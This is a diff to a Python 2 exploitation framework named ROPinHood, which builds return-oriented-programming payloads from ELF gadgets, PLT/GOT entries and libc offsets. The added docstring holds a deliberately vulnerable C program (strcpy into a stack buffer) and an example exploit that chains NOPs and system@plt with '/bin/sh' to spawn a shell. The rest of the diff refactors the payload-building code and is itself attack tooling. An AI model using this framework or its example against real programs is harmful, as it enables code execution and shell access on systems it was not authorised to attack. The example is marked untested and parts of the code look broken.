@@ -6,6 +6,7 @@ from lib import readelf
 import time
 from subprocess import *
 from threading import Thread
+import re
 
 #
 # TO DO:
@@ -16,18 +17,58 @@ from threading import Thread
 
 
 class ROPinHood(object):
+    ''' Framework for constructing ROP-based exploits.
+Example:
+file.c:
+int main(int argc, char argv[]){
+    int buf[64];
+    strcpy(buf, argv[1]);
+    return 0;
+}
+
+Exploit.py: Assume known address for system
+import ROPinHood as R
+rop = R.ROPinHood('file')
+rop.add_gadget({'nops' : '\x90'*64})
+rop.add_gadget({'ebp' : 0x41414141})
+rop.insert('nops')
+rop.insert('ebp')
+rop.insert('system@plt', ['/bin/sh'])
+rop.send(rop.get_payload(0))
+rop.shell()
+
+Well, that's the basic idea... not tested :D
+'''
 
     def __init__(self, filename):
         self.ropgadget = gadgets.ROPGadget()
         self.elfreader = readelf.Elf()
 
         self.filename = filename
-        self.payloads = {0 : []} #self.payload}
         self._reprs = {0 : []}
         self.gadgets = {} # {'name': '', 'address': '', 'repr':''}
         self.poprets = {} # custom popret things
         self.__load_gadgets_from_file()
         self.prog = Popen(['./'+filename], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+
+    def _find_addr(self, arg, dictionary):
+        myGlobals = {}
+        for item in dictionary:
+            itemval = dictionary[item]
+            if item[0] == '.':
+                item = '_' + item[1:]
+            item = item.replace('@', '')
+            myGlobals.update({item : itemval})
+
+        if arg[0] == '.':
+            arg = '_' + arg[1:]
+        arg = arg.replace('@', '')
+        try:
+            value = p('<I', eval(arg, myGlobals))
+        except:
+            value = myGlobals[arg]
+
+        return value
 
     def send(self, payload):
         self.prog.stdin.write(''.join(payload))
@@ -50,11 +91,13 @@ class ROPinHood(object):
                 break
 
     def get_payload(self, i):
-        return ''.join(self.payloads[i])
+        st = []
+        for item in self._reprs[i]:
+            st.append(item[1])
+        return ''.join(st)
 
     def add_payload(self):
-        count = len(self.payloads)
-        self.payloads.update({count : []})
+        count = len(self._reprs)
         self._reprs.update({count : []})
 
     def __load_gadgets_from_file(self, trackback=3):
@@ -70,25 +113,25 @@ class ROPinHood(object):
 
         self.elfreader.read_libc_offset(self.filename)
         self._libc_offsets = self.elfreader._libc_offset
-        return True
 
-    def get_offset(self, elm):
-        if not elm in self._libc_offsets.keys():
-            print "[*] Warning, element not found in offset table"
-            return None
-        return self._libc_offsets[elm]
 
-    def get_in_got(self, elm):
-        if not elm in self._got.keys():
-            print "[*] Warning, element not found in GOT"
-            return None
-        return self._got[elm]
+    # def get_offset(self, elm):
+    #     if not elm in self._libc_offsets.keys():
+    #         print "[*] Warning, element not found in offset table"
+    #         return None
+    #     return self._libc_offsets[elm]
 
-    def get_in_plt(self, elm):
-        if not elm in self._plt.keys():
-            print "[*] Warning, element not found in PLT"
-            return None
-        return self._plt[elm]
+    # def get_in_got(self, elm):
+    #     if not elm in self._got.keys():
+    #         print "[*] Warning, element not found in GOT"
+    #         return None
+    #     return self._got[elm]
+
+    # def get_in_plt(self, elm):
+    #     if not elm in self._plt.keys():
+    #         print "[*] Warning, element not found in PLT"
+    #         return None
+    #     return self._plt[elm]
 
     def load_gadget(self, args):
         for key in args:
@@ -102,6 +145,43 @@ class ROPinHood(object):
                 else:
                     self.gadgets.update({key:val})
 
+    def __parse_func(self, function):
+        ''' A function belongs either in user supplied addresses or plt (more?)
+'''
+        function = function.replace(' ', '')
+        try:
+            fname, _ = re.split(r'[*+-/]', function)
+        except:
+            fname = function
+
+        if fname in self.gadgets:
+            result = (function, self._find_addr(fname, self.gadgets))
+        elif fname in self._plt:
+            result = (function, self._find_addr(fname, self._plt))
+        else:
+            result = (function, function)
+#            raise Exception("No entry for function name: %s" % function)
+        return result
+
+
+    def __unpack_args(self, args):
+        result = []
+
+        for arg in args:
+            if arg in self.gadgets: # manually inserted gets precedence
+                elm, got = arg.split('@')
+                result.append((arg, self._find_addr(arg, self._gadgets))) #self.gadgets[arg]))
+            elif 'got' in arg: # it's a got thing
+                elm, got = arg.split('@')
+                result.append((arg, self._find_addr(arg, self._got))) #self._got[arg])))
+            elif arg in self._plt: # find it in plt
+                elm, plt = arg.split('@')
+                result.append((arg, self._find_addr(arg, self._plt))) #self._plt[arg])))
+            else: #if arg in self._segments:
+                result.append((arg, self._find_addr(arg, self._segments))) #self._segments[arg])))
+        return result
+            
+
     def insert(self, item, args=False, ret=False):
         if not args:
             return self._insert_singleton(item)
@@ -109,29 +189,9 @@ class ROPinHood(object):
             return self._insert_link(item, args, ret)
 
     def _insert_singleton(self, item):
-        try:
-            itemval = self.gadgets[item]
-        except:
-            itemval = item
-        i = len(self.payloads)-1
-        self.payloads[i].append(itemval)
+        item, itemval = self.__parse_func(item) #self.gadgets[item]
+        i = len(self._reprs)-1
         self._reprs[i].append((item, itemval))
-        return True
-
-    def __unpack_args(self, args):
-        result = []
-        _repr_result = []
-        for arg in args:
-            if arg in self.gadgets: # manually inserted gets precedence
-                result.append((arg, self.gadgets[arg]))
-            elif 'got' in arg: # it's a got thing
-                elm, got = arg.split('@')
-                result.append((arg, p('<I', self._got[elm])))
-            elif arg in self._plt: # find it in plt
-                result.append((arg, p('<I', self._plt[arg])))
-            elif arg in self._segments:
-                result.append((arg, p('<I', self._segments[arg])))
-        return result
 
 
     def _insert_link(self, f, args, ret=False):
@@ -156,21 +216,14 @@ class ROPinHood(object):
                 fullname, popret_addr = poprets[0]
                 popret = p('<I', int(popret_addr))
 
-        i = len(self.payloads)-1
-        f = self.__unpack_args([f])[0]
+        i = len(self._reprs)-1
+        f = self.__parse_func(f)
         args = self.__unpack_args(args)
-        self.payloads[i].append(f[1])
-        self.payloads[i].append(popret)
-        [self.payloads[i].append(item[1]) for item in args]
 
         self._reprs[i].append((f[0], f[1]))
         self._reprs[i].append((name, popret))
         [self._reprs[i].append((item[0], item[1])) for item in args]
 
-        return True
-
-    def clear(self):
-        self.payload = []
 
     def __str__(self):
         def _format(item, key):
